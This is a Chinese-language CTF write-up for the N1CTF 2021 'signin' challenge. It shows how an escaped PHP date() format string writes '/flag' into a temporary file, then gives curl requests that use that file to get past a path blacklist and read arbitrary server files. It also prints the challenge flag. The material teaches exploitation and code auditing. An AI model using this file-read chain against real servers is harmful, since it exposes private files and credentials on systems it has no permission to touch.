# N1CTF 2021 - signin

## 题目简述

题目页面接收两个输入：POST 参数 `path`，以及在 GET 参数 `time` 存在时读取的原始请求体。核心逻辑可概括为：

```php
$path = $_POST['path'];
$time = isset($_GET['time'])
    ? urldecode(date(file_get_contents('php://input')))
    : date('Y/m/d H:i:s');
$name = '/var/www/tmp/'.time().rand().'.txt';

// 黑名单只检查 $path
file_put_contents($name, $time);
echo 'logpath:'.$name;

$check = preg_replace('/((\s)*(\n)+(\s)*)/i', '', file_get_contents($path));
if (is_file($check)) {
    echo file_get_contents($check);
}
```

目标文件是 `/flag`。直接把它放进 `path` 会被黑名单拦截，但程序允许先把一段由攻击者控制的文本写入随机临时文件，再把该临时文件内容当作第二级路径使用。

## 解题过程

### 利用 date 格式串生成字面量路径

当 URL 中带有 `time` 参数时，PHP 会把原始请求体直接作为 `date()` 的格式串。`date()` 中反斜杠表示“原样输出下一个字符”，因此下面的格式串会生成 `/flag`：

```text
/f\l\a\g
```

这里 `f` 本身不是有效格式符，而 `l`、`a`、`g` 会被反斜杠转义，所以结果恰好是字面量 `/flag`。本地仓库保留的官方提示用 `date('\/\f\l\a\g')` 演示同一机制，其输出同样为 `/flag`。

第一次请求使用 GET 方法并携带纯文本请求体：

```bash
curl -X GET \
  -H 'Content-Type: text/plain' \
  --data-binary '/f\l\a\g' \
  'http://TARGET/?time=1'
```

服务端把 `/flag` 写入类似下面的随机文件，并在响应中返回路径：

```text
logpath:/var/www/tmp/16374742701965404892.txt
```

### 用临时文件完成二级任意文件读取

第二次请求把刚才得到的临时文件路径作为 `path`：

```bash
curl -X POST \
  -F 'path=/var/www/tmp/16374742701965404892.txt' \
  'http://TARGET/'
```

临时路径本身不含黑名单中的危险片段，因此检查能够通过。随后：

1. `file_get_contents($path)` 读到字符串 `/flag`；
2. 去除换行后，`$check` 仍为 `/flag`；
3. `is_file('/flag')` 为真；
4. 最后的 `file_get_contents('/flag')` 输出 flag。

官方仓库只留下 96 字节的 `date()` 转义提示，没有完整源码和结果。上述控制流、请求格式及最终结果由[参赛者复盘](https://nisforrnicholas.github.io/others/N1CTF2021-signin/)补齐，并已将依赖该外链的关键信息完整写入正文。复盘记录的 flag 为：

```text
n1ctf{bypass_date_1s_s000_eassssy}
```

## 方法总结

本题不是直接绕过 `path` 黑名单，而是构造“路径的路径”：先利用 `date()` 格式串转义把 `/flag` 写入一个合法临时文件，再让程序读取临时文件并把其内容当作真正目标路径。审计这类代码时，必须跟踪数据经过多次文件读写后的语义变化；只检查第一层文件名，无法约束文件内容随后被当作路径再次使用的行为。
